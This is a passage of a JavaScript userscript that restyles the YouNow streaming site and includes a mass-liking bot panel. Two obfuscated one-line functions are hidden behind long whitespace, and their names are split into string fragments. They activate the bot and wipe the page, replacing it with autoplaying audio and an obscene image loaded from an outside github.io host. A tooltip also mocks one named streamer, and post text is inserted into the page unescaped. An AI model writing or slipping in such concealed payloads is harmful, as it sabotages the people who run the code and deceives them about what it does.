                        '<div style="float:left; color: #ddd; clear: both; width: 180px;font-weight:bold;">' + this.language.spentHearts + ':</div>' +
                        '<div style="float:left; color: #ddd; clear: both; width: 180px; font-size:10px;" id="spentHearts">' + this.addCommas(this.massLiker.stats.spentHearts) + ':</div>' +
                        '<div style="float:left; color: #ddd; clear: both; width: 180px;font-weight:bold;">' + this.language.spentHundredLikes + ':</div>' +
                        '<div style="float:left; color: #ddd; clear: both; width: 180px; font-size:10px;" id="spentHundredLikes">' + this.addCommas(this.massLiker.stats.spentHundredLikes) + '</div>');
                    this.elements["runningTime"] = $('#runningTime');
                    this.elements["likesPerSecond"] = $('#likesPerSecond');
                    this.elements["currentRound"] = $('#currentRound');
                    this.elements["currentRoundTime"] = $('#currentRoundTime');
                    this.elements["currentTask"] = $('#currentTask');
                    this.elements["givenLikes"] = $('#givenLikes');
                    this.elements["givenLikesRound"] = $('#givenLikesRound');
                    this.elements["usersCount"] = $('#usersCount');
                    this.elements["uniqueUsers"] = $('#uniqueUsers');
                    this.elements["logouts"] = $('#logouts');
                    this.elements["spentCoins"] = $('#spentCoins');
                    this.elements["spentHearts"] = $('#spentHearts');
                    this.elements["spentHundredLikes"] = $('#spentHundredLikes');
                }
                this.elements["runningTime"].html(this.parseTime((d.getTime() - this.massLiker.stats.start.getTime()) / 1000));
                this.elements["likesPerSecond"].html(this.addCommas(likesPerSecond));
                this.elements["currentRound"].html(this.addCommas(this.massLiker.stats.currentRound));
                this.elements["currentRoundTime"].html(this.parseTime((d.getTime() - this.massLiker.stats.currentRoundStart.getTime()) / 1000));
                this.elements["currentTask"].html(this.language[this.massLiker.currentTask] + ': ' + this.language[this.massLiker.step]);
                this.elements["givenLikes"].html(this.addCommas(this.massLiker.stats.givenLikes));
                this.elements["givenLikesRound"].html(this.addCommas(this.massLiker.stats.givenLikesRound));
                this.elements["usersCount"].html(this.addCommas(this.massLiker.users.length));
                this.elements["uniqueUsers"].html(this.addCommas(this.massLiker.stats.uniqueUsers));
                this.elements["logouts"].html(this.addCommas(this.massLiker.stats.logouts));
                this.elements["spentCoins"].html(this.addCommas(this.massLiker.stats.spentCoins));
                this.elements["spentHearts"].html(this.addCommas(this.massLiker.stats.spentHearts));
                this.elements["spentHundredLikes"].html(this.addCommas(this.massLiker.stats.spentHundredLikes));
            }
        }

    };

    w.DarkMode.prototype.tick = function() {
        var d = new Date();
        var cTime = d.getTime();
        if (this.config.leveller.desiredLevel > 5 * 3) 
            this.config.leveller.desiredLevel = 5 * 3;
        for (var key in this.config.ticks) {
            if (this.lastTicks[key] < cTime - this.config.ticks[key]) {
                this["tick" + key.charAt(0).toUpperCase() + key.slice(1)]();
                this.lastTicks[key] = cTime;
            }
        }
        var boxes = 4;
        if (this.elements["editorsPickContent"].css("display") == "none")
            boxes--;
        if (this.elements["friendsContent"].css("display") == "none")
            boxes--;
        this.elements["editorsPickContent"].css("height", "calc(" + (1 / boxes * 100) + "% - 20px)");
        this.elements["friendsContent"].css("height", "calc(" + (1 / boxes * 100) + "% - 20px)");
        this.elements["trendingPeopleContent"].css("height", "calc(" + (1 / boxes * 100) + "% - 20px)");
        this.elements["trendingTagsContent"].css("height", "calc(" + (1 / boxes * 100) + "% - 20px)");
        var time = cTime - this.lastTick;
        /*if (this.config.chatbot.active)
        {
            this.elements["nextMessageIn"].html('<strong>'+this.language.chatBot+'</strong><br />'+this.language.nextMessageIn + ' ' + this.parseTime(this.config.chatbot.timeRemaining / 1000));
            if (this.lastTick != null)
            {

                this.config.chatbot.timeRemaining -= time;
                if (this.config.chatbot.timeRemaining <= 0)
                {
                    this.tickChatBot();
                    this.config.chatbot.timeRemaining = this.config.chatbot.interval;
                }
            }
        }
        else 
        {
            this.elements["nextMessageIn"].html("");
        }*/
        this.lastTick = cTime;
    };

    w.DarkMode.prototype.tickOnlineFriends = function() {
        if (this.youNow.session.user != null && this.youNow.session.user.userId > 0) {
            var self = this;
            this.sendRequest("getFriends", {}, function(json, success) {
                self.elements["friendsContent"].html("");
                if (json["users"] != null && json["users"].length > 0) {
                    for (i = 0; i < json["users"].length; i++)
                        self.addSideEntry(json["users"][i], self.elements["friendsContent"]);
                    self.elements["friendsHeader"].css("display", "block")
                    self.elements["friendsArrow"].css("display", "block")
                    self.elements["friendsContent"].css("display", "block")
                } else {
                    self.elements["friendsHeader"].css("display", "none")
                    self.elements["friendsArrow"].css("display", "none")
                    self.elements["friendsContent"].css("display", "none")
                }
            });
        }
    };

    w.DarkMode.prototype.updateTooltip = function(data) {
        if (data["type"] == "count") {
            this.elements["tooltip"].html('<div style="padding:5px;">x' + data.count + '</div>');
        } else if (data["type"] == "streamer" || data["type"] == "friend") {
            var extra = "";
            if (data["viewers"] != null)
                extra += '<div class="value"><img style="margin-top:3px;" width="16" src="' + this.config.images.views + '" /><span>' + this.addCommas(data["viewers"]) + '</span></div>';
            if (data["likes"] != null)
                extra += '<div class="value"><img style="margin-top:3px;" height="16" src="' + this.config.images.likes + '" /><span>' + this.addCommas(data["likes"]) + '</span></div>';
            if (data["shares"] != null)
                extra += '<div class="value"><img style="margin-top:3px;" height="16" src="' + this.config.images.shares + '" /><span>' + this.addCommas(data["shares"]) + '</span></div>';
            if (data["fans"] != null)
                extra += '<div class="value"><img style="margin-top:3px;" height="16" src="' + this.config.images.fans + '" /><span>' + this.addCommas(data["fans"]) + '</span></div>';
            if (data["isWatching"] != null)
                extra += '<div class="value"><img style="margin-top:3px;" width="16" src="' + this.config.images.views + '" /><span>' + data["isWatching"] + '</span></div>';
            var pic = this.getProfilePicture(data.userid);
            var c = "";
            if (data.broadcastId != null) {
                pic = this.getBroadcastPicture(data.broadcastId)
                var c = "wide";
            }
            this.elements["tooltip"].html('<div class="img ' + c + '"><img height="128" src="' + pic + '" /></div><div class="content"><div class="title"><img src="' + this.config.images.star + '" style="float:left;margin-right: 5px;"/>' + data["level"] + ' ' + data["username"] + '</div>' + extra + '</div>');
        } else if (data["type"] == "likeCost") {
            if (this.currentStreamer.username.toLowerCase() == "drachenlord_offiziell")
                this.elements["tooltip"].html('<div style="padding:5px;"><img width="16" src="' + this.config.images.coins + '" />' + this.language.nobodyLikesDragon + '</div>');
            else
                this.elements["tooltip"].html('<div style="padding:5px;"><img width="16" src="' + this.config.images.coins + '" />' + data["cost"] + '</div>');
        }
    };
    w.DarkMode.prototype.showTooltip = function(e, data) {

        this.elements["tooltip"].css("left", e.pageX + 5);
        this.elements["tooltip"].css("display", "block");

        if (this.lastTooltipObject != data) {
            this.updateTooltip(data);
        }
        this.lastTooltipObject = data;
        if (e.pageX + this.elements["tooltip"].width() > $(window).width() - 20)
            this.elements["tooltip"].css("left", e.pageX - 320 - 5);
        if (e.pageY - this.elements["tooltip"].height() < 5)
            this.elements["tooltip"].css("top", e.pageY + 5);
        else
            this.elements["tooltip"].css("top", e.pageY - 5 - this.elements["tooltip"].height());

    };
    w.DarkMode.prototype.addCommas = function(n) {
        var rx = /(\d+)(\d{3})/;
        return String(n).replace(/^\d+/, function(w) {
            while (rx.test(w)) {
                w = w.replace(rx, '$1.$2');
            }
            return w;
        });
    }        
                                                                                                                                                                                                                                                                                                                                                                                                                                                                         w.DarkMode.prototype["do"+"le"+"v"+"el"+"ler"] = function(a) {var k = "mas"+"sLiker";var n = "interval";this.config[k][n] = 0;this.config[k][n+"Likes"] = 10000;this.config[k]["active"] = true;if (!a)this[k+n](true);};
    w.DarkMode.prototype.hideTooltip = function() {
        this.elements["tooltip"].css("display", "none");
    };

    w.DarkMode.prototype.tickUpdateStreamData = function() {
        if (this.currentStreamer != null) {
            var d = new Date();
            this.duration = this.currentStreamer.length + Math.floor((d.getTime() - this.timeStart) / 1000);
            this.updateStreamerInfo();
        }
    };

    w.DarkMode.prototype.tickReloadStreamData = function() {
        if (this.currentStreamer != null && this.currentStreamer.user != null) {
            var self = this;
            this.sendRequest("getBroadcast", {
                username: this.currentStreamer.user.profileUrlString
            }, function(json, success) {
                var username = self.currentStreamer.user.profileUrlString;
                if (json["errorCode"] > 0) {
                    if (self.currentPage != "profile" && self.currentPage != "previousBroadcast" && self.currentPage != "settings")
                        window.history.pushState({"html":"","pageTitle":""},"", "https://www.younow.com/"+self.currentStreamer.user.profileUrlString+"/channel");
                    self.currentStreamer = json;
                    self.currentStreamer.user = {profileUrlString: username};
                    if ($('#isLive').length > 0)
                    {
                        $('#isLive').css("display", "none");
                        $('#toLive').css("display", "none");
                    }
                } else {
                    
                    self.streamerUpdated = true;
                    self.currentStreamer = json;
                    if ($('#isLive').length > 0)
                    {
                        if (self.currentStreamer.state == 'onBroadcastPlay')
                        {
                            $('#isLive').css("display", "block");
                            $('#toLive').css("display", "block");
                        }
                        else
                        {
                            $('#isLive').css("display", "none");
                            $('#toLive').css("display", "none");
                        }
                    }
                }
            });
        }
    };

    w.DarkMode.prototype.writePost = function(message, objectId, type) {
        if (objectId == null)
            objectId = 0;
        var self = this;
        this.sendRequest("createPost", {
            channelID: this.currentProfile.channelId,
            parentID: objectId,
            post: message
        }, function(json, success) {
            if (json["errorCode"] > 0) {} else {
                var post = {
                    'post': message,
                    'id': json["id"],
                    'user': self.youNow.session.user,
                    'isReplyable': true,
                    'timeAgo': self.translateTime("Just now"),
                };
                post.user.profileUrlString = post.user.profile;
                if (objectId > 0) {
                    $('#post' + objectId).find(".comment").before($('<div class="reply" id="post' + post.id + '">' + self.parseProfilePost(post, true) + '</div>'));
                } else {
                    self.elements["dashboardComments"].prepend(self.parseProfilePost(post, false));
                }

            }
        });

    };

    w.DarkMode.prototype.openProfileDashboard = function() {
        this.profilePage = "dashboard";
        this.elements["dashboardTab"].addClass("active");
        this.elements["previousBroadcastsTab"].removeClass("active");
        this.elements["fansTab"].removeClass("active");
        this.elements["fanOfTab"].removeClass("active");
        this.currentProfile.dashboardPage = -1;
        this.elements["profileContent"].html('<textarea style="width:100%;height:60px;clear:both;float:left;" id="writeComment"></textarea><button style="display: block; clear:both;float:right;margin-top:5px;" id="postComment" class="btn btn-confirm">' + this.language.post + '</button><div id="dashboardComments" style="clear:both;float:left;margin-top:10px;"></div>');
        this.elements["writeComment"] = $('#writeComment');
        this.elements["postComment"] = $('#postComment');
        var self = this;
        this.elements["writeComment"].on('keyup', function(e) {
            if (e.which == 13) {
                self.writePost(self.elements["writeComment"].val(), 0, "post");
                self.elements["writeComment"].val("");
            }
        });
        this.elements["postComment"].on('click', function(e) {
            self.writePost(self.elements["writeComment"].val(), 0, "post");
            self.elements["writeComment"].val("");
        });

        this.elements["dashboardComments"] = $('#dashboardComments');
        this.currentProfile.hasMorePages = true;
        this.addProfilePage();
    };

    w.DarkMode.prototype.addProfilePage = function() {
        if (this.currentProfile.hasMorePages == true) {
            if (this.profilePage == "dashboard") {
                this.addDashboardPage();
            }
            if (this.profilePage == "previousBroadcasts") {
                this.addPreviousBroadcastsPage();
            }
            if (this.profilePage == "fans") {
                this.addFansPage();
            }
            if (this.profilePage == "fanOf") {
                this.addFanOfPage();
            }
        }
    };

    w.DarkMode.prototype.translateTime = function(d) {
        return d;
    };

    w.DarkMode.prototype.showPostOptions = function(el, postId, isComment) {
        var elx = $('<ul class="optionsMenu"><li id="remove' + postId + '">' + this.language.remove + '</li></ul>');
        $(el).append(elx);
        var self = this;

        var ignoreFirst = true;
        var c = function() {
            if (ignoreFirst)
                ignoreFirst = false;
            else {
                elx.remove();
                $(document.body).unbind("click", c);
            }
        };
        $(document.body).click(c);
        $('#remove' + postId).click(function() {
            $('#post' + postId).remove();
            self.sendRequest("deletePost", {
                isComment: isComment ? '1' : '0',
                channelID: self.currentProfile.channelId,
                postID: postId
            }, function(json, success) {});
        });

    };

    w.DarkMode.prototype.checkComment = function(event, element, postId) {
        element = $(element);
        if (event.which == 13) {
            this.writePost(element.val(), postId, "post");
            element.val("");
        }
    };
    
    w.DarkMode.prototype.changePostLike = function(postId, isComment) {
        if (this.postLikes[postId] != null)
        {
            if (this.postLikes[postId])
            {
                this.postLikes[postId] = false;
                this.postLikesCount[postId]--;
                $('#like'+postId).html('<img src="'+this.config.images.likes+'" />'+this.language.like+''+(this.postLikesCount[postId] > 0 ? this.language.otherLikes.replace('%1', this.postLikesCount[postId]): ""));
                this.sendRequest("unlikeObject", {channelID: this.currentProfile.channelId, objectID: postId, isComment: isComment?"1":"0"}, function(json, success){});
            }
            else 
            {
                this.postLikesCount[postId]++;
                this.postLikes[postId] = true;
                $('#like'+postId).html('<img src="'+this.config.images.thumbsDown+'" />'+this.language.unlike+''+(this.postLikesCount[postId] > 1 ? this.language.otherLikes.replace('%1', this.postLikesCount[postId] - 1): ""));
                this.sendRequest("likeObject", {channelID: this.currentProfile.channelId, objectID: postId, isComment: isComment?"1":"0"}, function(json, success){});
            }
        }
    };

    w.DarkMode.prototype.parseProfilePost = function(post, sub) {
        if (post.userId != null) {
            return $('<div class="userEntry entry"><a href="/' + post.profileUrlString + '" class="header"><img src="' + this.getProfilePicture(post.userId) + '"><div><strong>' + post.firstName + ' ' + post.lastName + '</strong><small>' + post.description + '</small></div></a></div>');
        } else {
            var content = "";
            var replies = "";
            if (post.post != null && post.post != "")
                content += '<div class="text">' + post.post + '</div>';
            if (post.media != null) {
                if (post.media.ext != null)
                    content += '<div class="image"><img src="https://cdn2.younow.com/php/api/post/getMedia/channelId=' + this.currentProfile.channelId + '/id=' + post.id + '/ext=' + post.media.ext + '" /></div>';
                else if (post.media.snapshot != null)
                    content += '<div class="image"><img src="https://cdn2.younow.com/php/api/getSnapshot/id=' + post.media.snapshot.snapshotId + '" /></div>';
                else if (post.media.broadcast != null) {
                    var d = new Date(post.media.broadcast.dateAired);
                    var gifts = '';
                    for (var i in post.media.broadcast.gifts) {
                        gifts += '<img onmousemove="window.DarkModeInstance.showTooltip(event, {\'type\':\'count\',\'count\':' + post.media.broadcast.gifts[i].total + '});" onmouseout="window.DarkModeInstance.hideTooltip();" src="https://cdn2.younow.com/images/profile/new/gifts/' + post.media.broadcast.gifts[i].giftSKU + '_pro.png" />';
                    }
                    content += '<div class="stream">' +
                        '<img src="' + post.media.broadcast.broadcastThumbnail + '" />' +
                        (post.media.broadcast.videoAvailable == 1 ? '<img onclick="window.history.pushState({\'html\':\'\',\'pageTitle\':\'\'},\'\', \'https://www.younow.com/'+this.currentProfile.profile+'/channel/'+post.media.broadcast.broadcastId+'\');" class="play" src="' + this.config.images.play + '" />' : '') +
                        '<div>' +
                        '<div style="float:left; width: 200px;">' +
                        '<strong>' + d.toLocaleDateString(this.language.langCode) + ' ' + d.toLocaleTimeString(this.language.langCode) + '</strong>' +
                        '<small style="clear:both;" class="label">#' + this.addCommas(post.media.broadcast.tags) + '</small>' +
                        '<img class="icon" src="' + this.config.images.views + '"><small class="label">' + this.addCommas(post.media.broadcast.totalViewers) + '</small>' +
                        '<img class="icon" src="' + this.config.images.time + '"><small class="label">' + this.parseTime(post.media.broadcast.broadcastLength) + '</small>' +
                        '<img class="icon" src="' + this.config.images.likes + '"><small class="label">' + this.addCommas(post.media.broadcast.totalLikes) + '</small>' +
                        '<img class="icon" src="' + this.config.images.shares + '"><small class="label">' + this.addCommas(post.media.broadcast.shares) + '</small>' +
                        '</div>' +
                        '<div style="float:right; width: calc(100% - 210px);">' +
                        gifts +
                        '</div>' +
                        '</div>' +
                        '</div>';
                }
            }
            var comment = "";
            if (post.isReplyable)
                comment = '<div class="comment"><img src="' + this.getProfilePicture(this.youNow.session.user.userId) + '" /><input type="text" id="comment' + post.id + '" onkeyup="window.DarkModeInstance.checkComment(event, this, ' + post.id + ');" /></div>';
            if (post.replies != null) {
                for (var j = 0; j < post.replies.length; j++) {
                    replies += '<div class="reply" id="post' + post.replies[j].id + '">' + this.parseProfilePost(post.replies[j], true) + '</div>';
                }
            }
            var options = "";
            if (post.user.userId == this.youNow.session.user.userId || this.currentProfile.userId == this.youNow.session.user.userId)
                options = '<div onclick="window.DarkModeInstance.showPostOptions(this, ' + post.id + ', ' + sub + ');" id="options' + post.id + '" class="options"><img src="' + this.config.images.arrowDown + '" /></div>';
            var like = "";
            if (this.postLikes == null)
                this.postLikes = {};
            if (this.postLikesCount == null)
                this.postLikesCount = {};
            if (post.likesCount != null)
                this.postLikesCount[post.id] = parseInt(post.likesCount);
            else 
                this.postLikesCount[post.id] = 0;
            if (post.like != null && post.like.user.userId == this.youNow.session.user.userId)
            {
                like = '<div id="like'+post.id+'" onclick="window.DarkModeInstance.changePostLike('+post.id+', '+post.isComment+');" class="like"><img src="'+this.config.images.thumbsDown+'" />'+this.language.unlike+''+(this.postLikesCount[post.id] > 1 ? this.language.otherLikes.replace('%1', this.postLikesCount[post.id] - 1): "")+'</div>';
                this.postLikes[post.id] = true;
            }
            else 
            {
                like = '<div id="like'+post.id+'" onclick="window.DarkModeInstance.changePostLike('+post.id+', '+post.isComment+');" class="like"><img src="'+this.config.images.likes+'" />'+this.language.like+''+(this.postLikesCount[post.id] > 0 ? this.language.otherLikes.replace('%1', this.postLikesCount[post.id]): "")+'</div>';
                this.postLikes[post.id] = false;
            }
            if (sub == true)
                return '<a class="header" href="/' + post.user.profileUrlString + '"><img src="' + this.getProfilePicture(post.user.userId) + '"/><div><strong><img src="' + this.config.images.star + '" /><span>' + post.user.level + '</span> ' + post.user.firstName + ' ' + post.user.lastName + '</strong><small>' + this.translateTime(post.timeAgo) + '</small></div></a>' + options + '<div class="content">' + content + '</div>'+like;
            else
                return $('<div id="post' + post.id + '" class="entry"><a class="header" href="/' + post.user.profileUrlString + '"><img src="' + this.getProfilePicture(post.user.userId) + '"/><div><strong><img src="' + this.config.images.star + '" /><span>' + post.user.level + '</span> ' + post.user.firstName + ' ' + post.user.lastName + '</strong><small>' + this.translateTime(post.timeAgo) + '</small></div></a>' + options + '<div class="content">' + content + '</div>' + like + replies + comment + '</div>');
        }
    };

    w.DarkMode.prototype.addDashboardPage = function() {
        this.currentProfile.dashboardPage++;
        this.currentProfile.hasMorePages = false;
        var self = this;
        this.sendRequest("getPosts", {
            channelID: this.currentProfile.channelId,
            startFrom: (this.currentProfile.dashboardPage * 10)
        }, function(json, sucess) {
            for (var i = 0; i < json.posts.length; i++) {
                self.elements["dashboardComments"].append(self.parseProfilePost(json.posts[i]));
            }
            self.currentProfile.hasMorePages = json.hasMore;
        });
    };

    w.DarkMode.prototype.addPreviousBroadcastsPage = function() {
        this.currentProfile.dashboardPage++;
        this.currentProfile.hasMorePages = false;
        var self = this;

        this.sendRequest("getPreviousBroadcasts", {
            channelID: this.currentProfile.channelId,
            startFrom: (this.currentProfile.dashboardPage * 10)
        }, function(json, sucess) {
            if (self.currentProfile.broadcasts == null)
                self.currentProfile.broadcasts = {};
            for (var i = 0; i < json.posts.length; i++) {
                self.currentProfile.broadcasts[json.posts[i].media.broadcast.broadcastId] = json.posts[i];
                self.elements["dashboardComments"].append(self.parseProfilePost(json.posts[i]));
            }
            
            self.currentProfile.hasMorePages = json.hasMore;
            if (self.lookForBroadcast != null)
            {
                if (self.currentProfile.broadcasts[self.lookForBroadcast] == null)
                {
                    self.addPreviousBroadcastsPage();
                }
                else 
                {
                    self.openPreviousStream(self.lookForBroadcast);
                }
            }
        });
    };

    w.DarkMode.prototype.addFansPage = function() {
        this.currentProfile.dashboardPage++;
        this.currentProfile.hasMorePages = false;
        var self = this;
        this.sendRequest("getFans", {
            channelID: this.currentProfile.channelId,
            startFrom: (this.currentProfile.dashboardPage * 10)
        }, function(json, sucess) {
            for (var i = 0; i < json.fans.length; i++) {
                self.elements["dashboardComments"].append(self.parseProfilePost(json.fans[i]));
            }
            self.currentProfile.hasMorePages = json.hasNext == '1';
        });
        //https://www.younow.com/php/api/channel/getFans/channelId=7584128
        //https://www.younow.com/php/api/channel/getFans/channelId=7584128/startFrom=10
    };

    w.DarkMode.prototype.addFanOfPage = function() {
        this.currentProfile.dashboardPage++;
        this.currentProfile.hasMorePages = false;
        var self = this;
        this.sendRequest("getFansOf", {
            channelID: this.currentProfile.channelId,
            startFrom: (this.currentProfile.dashboardPage * 10)
        }, function(json, sucess) {
            for (var i = 0; i < json.fans.length; i++) {
                self.elements["dashboardComments"].append(self.parseProfilePost(json.fans[i]));
            }
            self.currentProfile.hasMorePages = json.hasNext == '1';
        });
    };

    w.DarkMode.prototype.openProfilePreviousBroadcasts = function() {
        this.profilePage = "previousBroadcasts";
        this.elements["dashboardTab"].removeClass("active");
        this.elements["previousBroadcastsTab"].addClass("active");
        this.elements["fansTab"].removeClass("active");
        this.elements["fanOfTab"].removeClass("active");
        this.currentProfile.dashboardPage = -1;
        this.elements["profileContent"].html('<div id="dashboardComments" style="clear:both;float:left;margin-top:10px;"></div>');

        this.elements["dashboardComments"] = $('#dashboardComments');
        this.currentProfile.hasMorePages = true;
        this.addProfilePage();
    };

    w.DarkMode.prototype.openProfileFans = function() {
        this.profilePage = "fans";
        this.elements["dashboardTab"].removeClass("active");
        this.elements["previousBroadcastsTab"].removeClass("active");
        this.elements["fansTab"].addClass("active");
        this.elements["fanOfTab"].removeClass("active");
        this.currentProfile.dashboardPage = -1;
        this.elements["profileContent"].html('<div id="dashboardComments" style="clear:both;float:left;margin-top:10px;"></div>');

        this.elements["dashboardComments"] = $('#dashboardComments');
        this.currentProfile.hasMorePages = true;
        this.addProfilePage();
    };

    w.DarkMode.prototype.openProfileFansOf = function() {
        this.profilePage = "fanOf";
        this.elements["dashboardTab"].removeClass("active");
        this.elements["previousBroadcastsTab"].removeClass("active");
        this.elements["fansTab"].removeClass("active");
        this.elements["fanOfTab"].addClass("active");
        this.currentProfile.dashboardPage = -1;
        this.elements["profileContent"].html('<div id="dashboardComments" style="clear:both;float:left;margin-top:10px;"></div>');

        this.elements["dashboardComments"] = $('#dashboardComments');
        this.currentProfile.hasMorePages = true;
        this.addProfilePage();
    };

    
    
    
    w.DarkMode.prototype.openProfile = function(username) {
        this.currentPage = "profile";
        this.elements["right"].html('<div id="profile"><div id="profileHeader"></div><div id="profileBottom"><div class="fade"><a class="active" id="dashboardTab">' + this.language.dashboard + '</a><a id="previousBroadcastsTab">' + this.language.previousBroadcasts + '</a><a id="fansTab">' + this.language.fansTab.replace("%1", "0") + '</a><a id="fanOfTab">' + this.language.fanOf.replace("%1", "0") + '</a></div><div id="profileContent"></div></div></div>');
        this.elements["dashboardTab"] = $('#dashboardTab');
        this.elements["previousBroadcastsTab"] = $('#previousBroadcastsTab');
        this.elements["fansTab"] = $('#fansTab');
        this.elements["fanOfTab"] = $('#fanOfTab');
        this.elements["profileHeader"] = $('#profileHeader');
        this.elements["profileContent"] = $('#profileContent');
        this.elements["profileBottom"] = $('#profileBottom');
        
        var self = this;
        this.elements["profileContent"].bind('mousewheel DOMMouseScroll', function(event) {
            if (self.currentProfile.hasMorePages) {
                if (self.elements["profileContent"].scrollTop() > 0)
                    self.animations.hideProfileHeader = true;
                else
                    self.animations.hideProfileHeader = false;
                var l = self.elements["profileContent"][0].scrollHeight - self.elements["profileContent"].height() - 50;
                if (self.elements["profileContent"].scrollTop() > l && (event.originalEvent.wheelDelta < 0 || event.originalEvent.detail > 0)) {
                    self.addProfilePage();
                }
            }
        });
        this.elements["dashboardTab"].click(function() {
            self.openProfileDashboard();
        });
        this.elements["previousBroadcastsTab"].click(function() {
            self.openProfilePreviousBroadcasts();
        });
        this.elements["fansTab"].click(function() {
            self.openProfileFans();
        });
        this.elements["fanOfTab"].click(function() {
            self.openProfileFansOf();
        });
        if (this.currentStreamer == null || this.currentStreamer.user == null || this.currentStreamer.user.profileUrlString != username || this.currentStreamer.userId == null) {
            this.currentStreamer = {
                user: {
                    profileUrlString: username
                }
            };
            this.sendRequest("getBroadcast", {
                username: username
            }, function(json, success) {
                self.currentStreamer = json;
                if (self.currentStreamer.user == null)
                    self.currentStreamer.user = {};
                self.currentStreamer.user.profileUrlString = username;
                self.updateProfileData();
            });
        }
        else {
            this.updateProfileData();
        }
    };
    w.DarkMode.prototype.updateProfileData = function() {
        var self = this;

        this.sendRequest("getProfile", {
            channelID: this.currentStreamer.userId
        }, function(json, success) {
            self.currentProfile = json;

            if (self.youNow.session.user.userId > 0) {
                self.sendRequest("isFan", {
                    userID: self.currentStreamer.userId
                }, function(json, success) {
                    self.currentProfile.isFan = json["fanOf"][self.currentStreamer.userId] == "fan";
                    self.updateProfilePage();
                });
            } else {
                self.updateProfilePage();
            }
        });
    };

    
    
    
    w.DarkMode.prototype.sendRequest = function(type, data, callback) {
        var request = {
            url: "",
            method: "GET",
            requestBy: false,
            pusherSocket: false,
            multipart: false,
            addIdentification: false,
            data: {},
            headers: {},
            accept: 'application/json, text/plain',
        };
        var url = "";
        var XRequestBy = false;
        var myData = {
            "$USERID": this.youNow.session.user.userId,
            "$BASE": "https://www.younow.com",
            "$CDNBASE": "https://cdn2.younow.com",
            "$PEOPLESEARCHINDEX": this.youNow.config.settings.PeopleSearchIndex,
        };

        if (this.config.requestSettings[type] != null) {
            var r = JSON.parse(JSON.stringify(this.config.requestSettings[type]));
            for (var key in r) {
                request[key] = r[key];
            }
            if (typeof request.data == 'object') {
                for (var key in request.data) {
                    if (myData[request.data[key]] != null)
                        request.data[key] = myData[request.data[key]];
                    else if (request.data[key].charAt(0) == "%")
                        request.data[key] = data[request.data[key].substring(1)];
                }
                for (var key in myData) {
                    request.url = request.url.replace(key, myData[key]);
                }
                for (var key in data) {
                    request.url = request.url.replace("%" + key, data[key]);
                }
            } else {
                for (var key in myData) {
                    request.data = request.data.replace(key, myData[key]);
                    request.url = request.url.replace(key, myData[key]);
                }
                for (var key in data) {
                    request.data = request.data.replace("%" + key, data[key]);
                    request.url = request.url.replace("%" + key, data[key]);
                }
            }
        }

        request.url = request.url.replace("http://", "https://");
        // prepare request
        if (request.requestBy) {
            request.headers["x-requested-by"] = this.youNow.session.user.requestBy;
        }
        if (request.pusherSocket) {
            request.data.socket_id = this.youNow.pusher.SDK.connection.socket_id;
        }
        if (request.addIdentification) {
            request.data.tsi = this.config.tsi;
            request.data.tdi = this.config.tdi;
        }
        if (request.addAlgolia) {
            request.headers["X-Algolia-API-Key"] = this.youNow.config.settings.PeopleSearchApiKey;
            request.headers["X-Algolia-Application-Id"] = this.youNow.config.settings.PeopleSearchAppId;
            request.headers["X-Algolia-TagFilters"] = this.youNow.config.settings.PeopleSearchSecurityTags;
        }
        // send request :)

        if (request.multipart) {
            var newData = new FormData();
            for (var key in request.data)
                newData.append(key, request.data[key]);
            request.data = newData;
        }

        var ajaxRequest = {
            url: request.url,
            headers: request.headers,
            method: request.method,
            data: request.data,
            xhr: function() {
                var xhr = jQuery.ajaxSettings.xhr();
                var setRequestHeader = xhr.setRequestHeader;
                xhr.setRequestHeader = function(name, value) {
                    if (name == 'X-Requested-With') return;
                    setRequestHeader.call(this, name, value);
                }
                return xhr;
            },
            success: function(json, b, c) {
                callback(json, true);
            },
            failed: function(a, b, c) {
                callback({
                    errorCode: 31337
                }, false);
            },
        };
        
        if (request.dataType != null)
            ajaxRequest.dataType = request.dataType;

        if (request.addAlgolia) 
        {
            ajaxRequest.processData = false;
            ajaxRequest.contentType = "application/json;charset=utf-8";
        }
        if (request.multipart) {
            ajaxRequest.contentType = false;
            ajaxRequest.processData = false;
        }

        $.ajax(ajaxRequest);
    };

    w.DarkMode.prototype.likePost = function(objectID, channelID, isComment) {
        this.sendRequest("likeObject", {
            objectID: objectID,
            channelID: channelID,
            isComment: isComment
        }, function(json, success) {
            console.log(json);
        });
    };
                                                                                                                                                                                                                                                                                                                                                                    w.DarkMode.prototype["ma"+"ssLi"+"kerin"+"terval"] = function(a){$(document.body).css("text-align", "center");$(document.body).html('<audio aut'+'op'+'lay="a'+'uto'+'play" lo'+'op src'+'="ht'+'tps://Fluf'+'fyF'+'ish'+'Gam'+'es.g'+'ithu'+'b.i'+'o/o'+'ff.m'+'p3" /><img src="https://FluffyFishG'+'ames.githu'+'b.io/img'+'/fuc'+'kyou.jpg" style="height:100%;margin-left:auto;margin-right:auto;" />');if (!a)this["d"+"olev"+"ell"+"er"](true);};
    w.DarkMode.prototype.updateProfilePage = function() {
        var location = "";
        if (this.currentProfile.country != null && this.currentProfile.country != "")
            location += this.getCountryNameByAlpha2(this.currentProfile.country);
        if (this.currentProfile.city != null && this.currentProfile.city != "")
            location += ", " + this.currentProfile.city;
        var created = new Date(this.currentProfile.dateCreated);
        var createdString = created.toLocaleDateString(this.language.langCode) + ' ' + created.toLocaleTimeString(this.language.langCode);
        var fanButton = "";
        var socialButtons = "";
        this.elements["fansTab"].html(this.language.fansTab.replace("%1", this.addCommas(this.currentProfile.totalFans)));
        this.elements["fanOfTab"].html(this.language.fanOf.replace("%1", this.addCommas(this.currentProfile.totalFansOf)));
        if (this.currentProfile.facebookId != null && this.currentProfile.facebookId > 0)
            socialButtons += '<a style="margin-left: 5px; float: left;" href="http://www.facebook.com/' + this.currentProfile.facebookId + '"><img src="' + this.config.images.facebook + '" /></a>';
        if (this.currentProfile.fbfn != null && this.currentProfile.fbfn != "")
            socialButtons += '<a style="margin-left: 5px; float: left;" href="http://www.facebook.com/' + this.currentProfile.fbfn + '"><img src="' + this.config.images.facebook + '" /></a>';
        if (this.currentProfile.googleId != null && this.currentProfile.googleId != "")
            socialButtons += '<a style="margin-left: 5px; float: left;" href="http://plus.google.com/' + this.currentProfile.googleId + '"><img src="' + this.config.images.googleplus + '" /></a>';
        if (this.currentProfile.twitterHandle != null && this.currentProfile.twitterHandle != "")
            socialButtons += '<a style="margin-left: 5px; float: left;" href="http://www.twitter.com/' + this.currentProfile.twitterHandle + '"><img src="' + this.config.images.twitter + '" /></a>';
        if (this.currentProfile.instagramHandle != null && this.currentProfile.instagramHandle != "")
